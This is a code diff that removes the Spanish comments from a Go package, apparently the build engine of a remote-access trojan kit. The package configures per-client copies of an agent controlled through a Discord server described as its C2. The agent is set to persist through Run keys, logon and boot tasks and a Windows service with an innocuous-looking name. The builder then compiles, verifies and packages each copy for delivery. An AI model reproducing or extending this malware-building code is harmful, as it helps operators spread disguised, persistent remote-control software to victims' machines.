@@ -1,10 +1,3 @@
-// Package kit es el motor de compilación de clientes: valida credenciales,
-// inyecta la identidad con -ldflags, comprueba el binario resultante y arma el
-// paquete de entrega.
-//
-// Lo usan dos consumidores distintos: el builder de línea de comandos y
-// GoVoid Studio. Toda la lógica vive aquí para que los dos caminos produzcan
-// exactamente el mismo binario y la misma nota.
 package kit
 
 import (
@@ -32,23 +25,14 @@ import (
 )
 
 const (
-	// ModulePath es el módulo del agente. El builder vive dentro del mismo
-	// repo, así que compilar es solo apuntar a ./cmd/agent.
 	ModulePath = "github.com/local/govoid"
 
-	// ConfigPath es el paquete cuyas variables parchea el enlazador.
 	ConfigPath = ModulePath + "/internal/config"
 
-	// DiscordAPI es la base de la API REST.
 	DiscordAPI = "https://discord.com/api/v10"
 
-	// UserAgent es obligatorio: Discord responde 403 sin él.
 	UserAgent = "DiscordBot (" + ModulePath + ", 1.0)"
 
-	// InvitePermissions es la suma de permisos que el agente necesita para
-	// crear canales de sesión y publicar el panel: MANAGE_CHANNELS(16) +
-	// VIEW_CHANNEL(1024) + SEND_MESSAGES(2048) + MANAGE_MESSAGES(8192) +
-	// EMBED_LINKS(16384) + ATTACH_FILES(32768) + READ_MESSAGE_HISTORY(65536).
 	InvitePermissions = 125968
 )
 
@@ -61,29 +45,26 @@ var (
 	reFile     = regexp.MustCompile(`^[A-Za-z0-9._-]{0,64}$`)
 )
 
-// Options es todo lo que distingue una copia del agente de otra.
 type Options struct {
-	ID             string // token corto: mutex, servicio, tareas, rutas
-	Name           string // nombre visible en panel y webhooks
-	Token          string // token del bot de Discord
-	Guild          string // guild donde vive el C2
-	Webhook        string // webhook de avisos
-	Category       string // categoría de los canales de sesión (opcional)
-	ChannelPrefix  string // prefijo de los canales de sesión
-	BinaryName     string // nombre del ejecutable instalado
-	RunKey         string // valor en las claves Run
-	TaskLogon      string // tarea de logon
-	TaskBoot       string // tarea de arranque
-	ServiceDisplay string // nombre visible del servicio
-	OutDir         string // carpeta de salida
-	Repo           string // raíz del código del agente
-	KeepSymbols    bool   // sin -s -w, para depurar
-	ForceShared    bool   // permite reutilizar el token del agente local
-	Package        bool   // empaquetar el resultado en .zip
+	ID             string
+	Name           string
+	Token          string
+	Guild          string
+	Webhook        string
+	Category       string
+	ChannelPrefix  string
+	BinaryName     string
+	RunKey         string
+	TaskLogon      string
+	TaskBoot       string
+	ServiceDisplay string
+	OutDir         string
+	Repo           string
+	KeepSymbols    bool
+	ForceShared    bool
+	Package        bool
 }
 
-// Logf recibe las líneas de progreso. Nunca se llama en paralelo: Build
-// serializa sus escrituras.
 type Logf func(line string)
 
 func (f Logf) call(line string) {
@@ -98,7 +79,6 @@ func (f Logf) printf(format string, args ...any) {
 	}
 }
 
-// Normalize valida y rellena los valores derivados. Es idempotente.
 func (o *Options) Normalize() error {
 	o.ID = strings.TrimSpace(o.ID)
 	o.Name = strings.TrimSpace(o.Name)
@@ -184,9 +164,6 @@ func (o *Options) Normalize() error {
 	return nil
 }
 
-// ValidateRemote valida solo lo que se comprueba contra la API: token, guild,
-// categoría y webhook. Sirve para el botón "Probar conexión", que no debe
-// exigir todavía una carpeta de código ni un nombre de binario.
 func (o Options) ValidateRemote() error {
 	token := strings.TrimSpace(o.Token)
 	guild := strings.TrimSpace(o.Guild)
@@ -206,7 +183,6 @@ func (o Options) ValidateRemote() error {
 	return nil
 }
 
-// IsRepo indica si dir es la raíz de un módulo que contiene ./cmd/agent.
 func IsRepo(dir string) bool {
 	if dir == "" {
 		return false
@@ -218,8 +194,6 @@ func IsRepo(dir string) bool {
 	return err == nil && info.IsDir()
 }
 
-// FindRepo sube desde start buscando la raíz del proyecto. Sirve para que la
-// app funcione aunque se lance desde dist o desde el escritorio.
 func FindRepo(start string) string {
 	dir := start
 	if dir == "" {
@@ -242,9 +216,6 @@ func FindRepo(start string) string {
 	}
 }
 
-// --- credenciales ---
-
-// Report es lo que devuelve una validación correcta.
 type Report struct {
 	BotName        string
 	BotID          string
@@ -271,7 +242,6 @@ type discordHook struct {
 
 var httpClient = &http.Client{Timeout: 20 * time.Second}
 
-// Check valida token, guild y webhook contra la API. No compila nada.
 func (o Options) Check(ctx context.Context, logf Logf) (Report, error) {
 	var report Report
 
@@ -305,9 +275,6 @@ func (o Options) Check(ctx context.Context, logf Logf) (Report, error) {
 	return report, nil
 }
 
-// GuardSharedToken impide el fallo clásico: compilar un cliente con el token
-// del agente que ya corre en esta máquina. Discord admite una sola sesión de
-// gateway por token; las dos copias se expulsan en bucle y ninguna responde.
 func (o Options) GuardSharedToken() (string, error) {
 	own := AppIDFromToken(config.BotToken)
 	built := AppIDFromToken(o.Token)
@@ -327,8 +294,6 @@ func (o Options) GuardSharedToken() (string, error) {
 		own, config.ProductID, o.ID)
 }
 
-// AppIDFromToken saca el id de aplicación del propio token: la primera sección
-// es el snowflake de la app en base64url.
 func AppIDFromToken(token string) string {
 	head, _, found := strings.Cut(strings.TrimSpace(token), ".")
 	if !found {
@@ -350,8 +315,6 @@ func AppIDFromToken(token string) string {
 	return decoded
 }
 
-// InviteURL arma el enlace de invitación con los scopes y permisos que el
-// agente necesita. Devuelve error si el token no lleva un app id legible.
 func InviteURL(token string) (string, error) {
 	appID := AppIDFromToken(token)
 	if appID == "" {
@@ -394,9 +357,6 @@ func getJSON(ctx context.Context, url, token string, target any) error {
 	return json.Unmarshal(body, target)
 }
 
-// --- compilación ---
-
-// Result es el binario terminado.
 type Result struct {
 	Path     string
 	Name     string
@@ -408,8 +368,6 @@ type Result struct {
 	ZipPath  string
 }
 
-// FindGo localiza go.exe. Primero el PATH; luego la instalación por defecto
-// del instalador oficial.
 func FindGo() (string, error) {
 	if path, err := exec.LookPath("go"); err == nil {
 		return path, nil
@@ -421,8 +379,6 @@ func FindGo() (string, error) {
 	return "", errors.New("no encuentro go.exe: añade Go al PATH")
 }
 
-// Build compila el agente con la identidad del cliente, verifica que el
-// binario la lleva dentro y escribe la nota de entrega.
 func Build(ctx context.Context, o Options, logf Logf) (*Result, error) {
 	if err := o.Normalize(); err != nil {
 		return nil, err
@@ -517,9 +473,6 @@ func compile(ctx context.Context, goBin string, o Options, out string, logf Logf
 		{"ServiceDisplayName", o.ServiceDisplay},
 	}
 	for _, pair := range overrides {
-		// strconv.Quote produce la forma exacta que entiende el parser de
-		// -ldflags. Sin esto un valor con espacios ("WinHelp Shield") se parte
-		// en dos tokens y el enlazador recibe basura.
 		definition := ConfigPath + "." + pair[0] + "=" + pair[1]
 		ldflags = append(ldflags, "-X", strconv.Quote(definition))
 	}
@@ -548,9 +501,6 @@ func compile(ctx context.Context, goBin string, o Options, out string, logf Logf
 	return nil
 }
 
-// ReadIdentity ejecuta el binario recién compilado en modo --identity. Ese modo
-// no conecta al bot, no instala nada y no dibuja: solo escribe los nombres
-// resueltos y sale.
 func ReadIdentity(ctx context.Context, exe string) (string, error) {
 	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("govoid_id_%d.txt", time.Now().UnixNano()))
 	defer func() { _ = os.Remove(tmp) }()
@@ -568,7 +518,6 @@ func ReadIdentity(ctx context.Context, exe string) (string, error) {
 	return strings.TrimRight(string(payload), "\r\n"), nil
 }
 
-// FileSHA256 devuelve el hash en hex de un archivo.
 func FileSHA256(path string) (string, error) {
 	file, err := os.Open(path)
 	if err != nil {
@@ -587,7 +536,6 @@ func FileSHA256(path string) (string, error) {
 	return hex.EncodeToString(hash.Sum(nil)), nil
 }
 
-// PackageDir comprime el binario, la nota y el manifiesto de hashes.
 func (o Options) PackageDir(result *Result) (string, error) {
 	name := fmt.Sprintf("%s-%s-%s.zip", safeSlug(o.Name), o.ID, time.Now().Format("20060102-1504"))
 	zipPath := filepath.Join(o.OutDir, name)
@@ -666,7 +614,6 @@ func safeSlug(value string) string {
 	return slug
 }
 
-// SortedFiles lista el contenido de la carpeta de salida, ordenado.
 func SortedFiles(dir string) []string {
 	entries, err := os.ReadDir(dir)
 	if err != nil {
@@ -679,8 +626,6 @@ func SortedFiles(dir string) []string {
 	sort.Strings(names)
 	return names
 }
-
-// --- entrega ---
 
 func (o Options) deliveryNote(result *Result) string {
 	var b strings.Builder
